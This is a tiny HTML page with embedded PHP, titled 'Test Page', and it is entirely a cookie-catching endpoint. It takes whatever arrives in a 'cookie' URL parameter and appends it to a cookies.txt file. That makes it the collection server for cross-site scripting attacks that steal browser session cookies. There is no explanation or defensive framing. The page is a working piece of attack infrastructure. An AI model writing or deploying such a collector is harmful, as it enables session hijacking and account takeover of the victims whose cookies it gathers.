<!DOCTYPE html>
<html>
<head>
    <title>Test Page</title>
</head>
<body>
<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    file_put_contents("cookies.txt", $cookie . "\n", FILE_APPEND);
}
?>

</body>
</html>

